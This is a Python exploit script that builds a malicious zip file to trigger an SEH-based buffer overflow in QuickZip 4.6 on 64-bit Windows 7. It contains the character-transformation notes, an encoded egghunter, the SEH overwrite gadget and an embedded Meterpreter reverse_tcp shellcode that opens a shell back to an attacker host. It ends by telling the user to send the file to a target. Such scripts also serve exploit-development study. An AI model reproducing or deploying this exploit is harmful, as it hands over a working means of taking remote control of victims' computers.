#!/usr/bin/python
#
# QuickZip 4.6 x64bit Exploit
# Win7 Tested
# Author: @HackOnTwoWheels
#
# Badchars
# 0x00, 0x0a, 0x0d, 0x3a, 0x5C
# 0x2f becomes 0x5C (also creates folder but does not break BoF)
#
#
# Transformed Characters table
#
# transformed
# orginal 
#
# 5C A4 B6 A7 5C C7 FC E9 E2 E4 E0 E5 E7 EA EB E8 EF EE EC C4 C5 C9 E6 C6 F4 F6 F2 FB F9 FF D6 DC A2 A3 A5 50 83
# 2F 0F 14 15 2F 80 81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f 90 91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f

# E1 ED F3 FA F1 D1 AA BA BF AC AC BD BC A1 AB BB A6 A6 A6 A6 A6 A6 A6 2B 2B A6 A6 2B 2B 2B 2B 2B
# a0 a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf

# 2B 2D 2D 2B 2D 2B A6 A6 2B 2B 2D 2D A6 2D 2B 2D 2D 2D 2D 2B 2B 2B 2B 2B 2B 2B 2B A6 5F A6 A6 AF
# c0 c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf d0 d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df

# 61 DF 47 70 53 73 B5 74 46 54 4F 64 38 66 65 6E 3D B1 3D 3D 28 29 F7 98 B0 B7 B7 76 6E B2 A6 A0
# e0 e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef f0 f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff



#Zip File Headers
header_1 = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")

header_2 = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")

header_3 = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")

#!mona egghunter -wow64
#cat egghunter64.txt | xxd -r -p > egghunter-wow64.bin
#cat egghunter-wow64.bin |msfvenom -a x86_64 --platform windows -e x86/alpha_mixed -f python -b "\x00\x0b\x0d\x0a\x5c\x3a" BufferRegister=EAX -v egghunter
#Payload size: 146 bytes
egghunter =  ""
egghunter += "\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
egghunter += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
egghunter += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
egghunter += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
egghunter += "\x42\x75\x4a\x49\x50\x31\x59\x4b\x46\x33\x33\x63"
egghunter += "\x71\x43\x33\x63\x6c\x73\x4f\x30\x62\x46\x6e\x61"
egghunter += "\x49\x5a\x4b\x4f\x44\x4f\x43\x72\x63\x62\x43\x5a"
egghunter += "\x51\x36\x30\x58\x57\x43\x69\x59\x6e\x6b\x69\x44"
egghunter += "\x70\x64\x69\x6f\x76\x73\x43\x6e\x62\x7a\x67\x4c"
egghunter += "\x54\x45\x63\x44\x4a\x49\x4d\x68\x34\x37\x30\x30"
egghunter += "\x36\x50\x71\x64\x6e\x6b\x68\x7a\x6c\x6f\x42\x55"
egghunter += "\x4a\x44\x6c\x6f\x71\x65\x48\x61\x59\x6f\x38\x67"
egghunter += "\x41\x41"

#calculate eax for encoded egghunter 9 bytes
eax_cal =  "\x54"                    #push esp
eax_cal += "\x58"                   #pop eax
eax_cal += "\x2d\x1C\x97\x98\x98"   #sub \xff\xff\xf9\x1c  - transformed from table above
eax_cal += "\x98\x85"               #jmp eax               - transformed from table above ( \xFF\xE0 )

#shellcode
#msfvenom -p windows/exec -p windows/meterpreter/reverse_tcp lhost=192.168.56.102 lport=443  -b '\x00\x0a\x0d' -f python -v shellcode
shellcode = "w00tw00t"
shellcode += "\xb8\xaf\xc1\x94\xe2\xd9\xf6\xd9\x74\x24\xf4\x5a"
shellcode += "\x29\xc9\xb1\x56\x31\x42\x13\x03\x42\x13\x83\xea"
shellcode += "\x53\x23\x61\x1e\x43\x26\x8a\xdf\x93\x47\x02\x3a"
shellcode += "\xa2\x47\x70\x4e\x94\x77\xf2\x02\x18\xf3\x56\xb7"
shellcode += "\xab\x71\x7f\xb8\x1c\x3f\x59\xf7\x9d\x6c\x99\x96"
shellcode += "\x1d\x6f\xce\x78\x1c\xa0\x03\x78\x59\xdd\xee\x28"
shellcode += "\x32\xa9\x5d\xdd\x37\xe7\x5d\x56\x0b\xe9\xe5\x8b"
shellcode += "\xdb\x08\xc7\x1d\x50\x53\xc7\x9c\xb5\xef\x4e\x87"
shellcode += "\xda\xca\x19\x3c\x28\xa0\x9b\x94\x61\x49\x37\xd9"
shellcode += "\x4e\xb8\x49\x1d\x68\x23\x3c\x57\x8b\xde\x47\xac"
shellcode += "\xf6\x04\xcd\x37\x50\xce\x75\x9c\x61\x03\xe3\x57"
shellcode += "\x6d\xe8\x67\x3f\x71\xef\xa4\x4b\x8d\x64\x4b\x9c"
shellcode += "\x04\x3e\x68\x38\x4d\xe4\x11\x19\x2b\x4b\x2d\x79"
shellcode += "\x94\x34\x8b\xf1\x38\x20\xa6\x5b\x54\x85\x8b\x63"
shellcode += "\xa4\x81\x9c\x10\x96\x0e\x37\xbf\x9a\xc7\x91\x38"
shellcode += "\xab\xc0\x21\x96\x13\x80\xdf\x17\x63\x88\x1b\x43"
shellcode += "\x33\xa2\x8a\xec\xd8\x32\x32\x39\x74\x39\xa4\x02"
shellcode += "\x20\x05\x52\xeb\x32\x76\x9b\x50\xbb\x90\xcb\xf6"
shellcode += "\xeb\x0c\xac\xa6\x4b\xfd\x44\xad\x44\x22\x74\xce"
shellcode += "\x8f\x4b\x1f\x21\x79\x23\x88\xd8\x20\xbf\x29\x24"
shellcode += "\xff\xc5\x6a\xae\xf5\x3a\x24\x47\x7c\x29\x51\x30"
shellcode += "\x7e\xb1\xa2\xd5\x7e\xdb\xa6\x7f\x29\x73\xa5\xa6"
shellcode += "\x1d\xdc\x56\x8d\x1e\x1b\xa8\x50\x16\x57\x9f\xc6"
shellcode += "\x16\x0f\xe0\x06\x96\xcf\xb6\x4c\x96\xa7\x6e\x35"
shellcode += "\xc5\xd2\x70\xe0\x7a\x4f\xe5\x0b\x2a\x23\xae\x63"
shellcode += "\xd0\x1a\x98\x2b\x2b\x49\x9a\x2c\xd3\x0f\xb5\x94"
shellcode += "\xbb\xef\x85\x24\x3b\x9a\x05\x75\x53\x51\x29\x7a"
shellcode += "\x93\x9a\xe0\xd3\xbb\x11\x65\x91\x5a\x25\xac\x77"
shellcode += "\xc2\x26\x43\xac\xf5\x5d\x2c\x53\xf6\xa1\x24\x30"
shellcode += "\xf7\xa1\x48\x46\xc4\x77\x71\x3c\x0b\x44\xc6\x4f"
shellcode += "\x3e\xe9\x6f\xda\x40\xbd\x70\xcf"



print "[*] Building Exploit Zip File.."

max_size = 4064
offset_nseh = 292
payload = egghunter
payload += "A" * (offset_nseh - len(egghunter) - len(eax_cal))
payload += eax_cal
payload += "\x89\x88\x41\x41"   #nseh
payload += "\x2c\x08\x41\x00"   #seh 0x0041082c : pop ecx # pop ebp # ret 0x04
payload += "D" * (max_size - len(payload))
payload += ".txt"


print "[+] Length = " + str(len(payload))

exploit = header_1 + payload + header_2 + payload + header_3 + shellcode

mefile = open('exploit.zip','w');
mefile.write(exploit);
mefile.close()

print "[+] Exploit file built!"
print "[+] Rename exploit.zip and send file to target!"

